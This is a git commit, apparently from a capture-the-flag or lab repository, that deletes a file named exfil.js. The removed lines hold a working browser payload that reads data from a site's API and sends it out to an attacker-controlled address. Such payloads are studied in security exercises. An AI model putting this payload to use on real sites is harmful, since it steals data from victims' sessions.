5e550a5232fff0fc0ccc4dff072e32055eff3fc0
EsevKa <139042999+Esevka@users.noreply.github.com>
2025-04-24 16:54:53 +0200

    Delete exfil.js

--- exfil.js
+++
@@ -1,9 +0,0 @@
-var xhr = new XMLHttpRequest();
-xhr.onreadystatechange = () =>{
-        if(xhr.readyState == XMLHttpRequest.DONE){
-                openwindow = window.open("http://10.0.2.17/?exfil=" + xhr.response);
-                setTimeout(()=>openwindow.close(),500)
-        }
-};
-xhr.open('GET',"https://guitjapeo.thl/api/info",false);
-xhr.send();
